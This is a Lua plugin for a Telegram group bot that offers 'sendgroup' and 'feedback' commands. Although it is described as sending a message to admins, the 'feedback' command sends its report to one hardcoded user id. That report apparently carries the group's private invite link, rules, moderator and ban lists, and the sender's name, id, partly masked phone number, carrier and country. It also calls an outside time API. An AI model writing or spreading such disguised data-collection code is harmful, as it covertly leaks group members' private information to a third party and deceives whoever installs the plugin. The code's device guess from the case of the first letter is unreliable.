do 
 
function run(msg, matches)
if matches[1] == 'sendgroup' and is_sudo(msg) then
		local response = matches[3]
		local receiver = get_receiver(msg)
		send_large_msg("channel#id"..matches[2], response)
		send_large_msg(receiver, "Sended")
	end
	if matches[1] == 'feedback' and is_owner(msg) then
 local data = load_data(_config.moderation.data)
       local text = ''
	   ------------------Link---------------------
      local group_link = data[tostring(msg.to.id)]['settings']['set_link']
       if group_link then
      text = text..'Group Link : \n'..group_link..'\n'
    else
      text = text..'Group link : no link\n'
       end
	   ------------------type---------------------
   local group_type = data[tostring(msg.to.id)]['group_type']
   if group_type then
      text = text..'Group type : '..group_type..'\n'
    else
      text = text..'`Group type` : not set\n'
       end
	   ------------------about---------------------
  local data_cat = 'description'
  local about = data[tostring(msg.to.id)][data_cat]
  if about then
      text = text..'Group about : '..about..'\n'
    else
      text = text..'Group about : not set\n'
       end
       ------------------rules---------------------
  local data_cat2 = 'rules'
  local rules = data[tostring(msg.to.id)][data_cat2]
  if rules then
      text = text..'Group rules : '..rules..'\n'
    else
      text = text..'Group rules : not set\n'
       end
       ------------------Mods-List---------------------
local adminslist = ''
for k,v in pairs(data[tostring(msg.to.id)]['moderators']) do
  adminslist = adminslist .. '> @'.. v ..' ('..k..')\n'
end
       ------------------Phone-Location-Simcard---------------------
if msg.text then
		inputtext = string.sub(msg.text, 0,1)
		if msg.text then
			if string.match(inputtext, "[a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z]") then
				hardware = "Pc"
			elseif string.match(inputtext, "[A|B|C|D|E|F|G|H|I|J|K|L|M|N|O|P|Q|R|S|T|U|V|W|X|Y|Z]") then
				hardware = "Mobile"
			else
				hardware = "-----"
			end
		else
			hardware = "-----"
		end
	else
		hardware = "-----"
	end

 if msg.from.username then
      User_name = '@'..msg.from.username
    else
      User_name = ''
    end 
	function getusernumo(phonen)
local pt
if string.match(phonen, "^98910") or string.match(phonen, "^98911") or string.match(phonen, "^98912") or string.match(phonen, "^98913") or string.match(phonen, "^98914") or string.match(phonen, "^98915") or string.match(phonen, "^98916") or string.match(phonen, "^98917") or string.match(phonen, "^98918") then
pt = 'Hamrah-e-aval'
elseif string.match(phonen, "^98919") or string.match(phonen, "^98990") then
pt = 'Hamrah-e-aval'
elseif string.match(phonen, "^98930") or string.match(phonen, "^98933") or string.match(phonen, "^98935") or string.match(phonen, "^98936") or string.match(phonen, "^98937") or string.match(phonen, "^98903") or string.match(phonen, "^98938") or string.match(phonen, "^98939") then
pt = 'IranCell'
elseif string.match(phonen, "^98901") or string.match(phonen, "^98902") then
pt = 'IranCell'
elseif string.match(phonen, "^98920") then
pt = 'Rightel'
elseif string.match(phonen, "^98921") then
pt = 'Rightel'
elseif string.match(phonen, "^98931") or string.match(phonen, "^989324") then
pt = 'Spadan'
elseif string.match(phonen, "^989329") then
pt = 'Taliya'
elseif string.match(phonen, "^98934") then
pt = 'KiSh'
elseif string.match(phonen, "^63908") then
pt = 'Philipin'
elseif string.match(phonen, "^1") then
pt = 'U.S.A'
elseif string.match(phonen, "^62") then
pt = 'Indonesia'
else
pt = 'Unknown'
end
return pt
end

local function getusernum(phonen)
local pt
if string.match(phonen, "^98") then
tt = 'Iran'
elseif string.match(phonen, "^63") then
tt = 'Philipin'
elseif string.match(phonen, "^1") then
tt = 'U.S.A'
elseif string.match(phonen, "^62") then
tt = 'Indonesia'
else
tt = 'Unknown'
end
return tt
end

if msg.from.phone then
    sim = '+'..string.gsub(tostring(msg.from.phone),string.sub(tostring(msg.from.phone),-4),'****')
	op = getusernumo(msg.from.phone)
	tt = getusernum(msg.from.phone)
	else
	sim = '----'
	op = '----'
	tt = '----'
	end
	------------------Messages---------------------
    local user_info = {}
	local uhash = 'user:'..msg.from.id
	local user = redis:hgetall(uhash)
	local um_hash = 'msgs:'..msg.from.id..':'..msg.to.id
	user_info.msgs = tonumber(redis:get(um_hash) or 0)
	------------------Time---------------------
	local url , res = http.request('http://api.gpmod.ir/time/')
          if res ~= 200 then return "No connection" end
      local jdat = json:decode(url)
	  ------------------Feedback---------------------
 local ch = 'channel#id'..msg.to.id 
 local fuse = '📌Feedback📌\n\n'..text..'Full name : ' .. msg.from.print_name .. '\nFirst name : ' .. (msg.from.first_name or "-----") .. '\nLast name : ' .. (msg.from.last_name or "-----") .. '\nUser : '..User_name..'\nUser Id : *' .. msg.from.id ..'\nTime : ' .. jdat.ENtime ..'\nDate : ' .. jdat.ENdate ..'\nPhone number : ' .. sim ..'\nSimcard : ' .. op ..'\nLocation : ' .. tt ..'\nMessages : ' .. user_info.msgs .. '\nConnecector : ' .. hardware .. '\nGroup Name : ' .. msg.to.title ..'\nGroup Id : '..msg.to.id.. '\n\nPm Send : \n'.. matches[2]  ..'\n\n' 
 local fuses = '!printf user#id' .. msg.from.id 
 
 
   local text = matches[1] 
   local chat = "user#id"..279198459 
 
 local sends = send_msg(chat, fuse..'Group moderators : \n'..adminslist..'\n '..ban_list(msg.to.id), ok_cb, true) 
return reply_msg(msg.id, '✅ Message successfully sent', ok_cb, false) 
 end 
 end 
 end
 return { 
 
  description = "نظر", 
 
  usage = "feedback: Send A Message To Admins.", 
  patterns = { 
  "^[!/](sendgroup) (%d+) (.*)$",
  "^[!/](feedback) (.*)$", 
  "^(sendgroup) (%d+) (.*)$",
  "^(feedback) (.*)$",
   
  }, 
  run = run 
 }

--team : @datak_team
--Powered by @shakh_telegram_bot : mamad datak ghadim :)
--Thanks solid
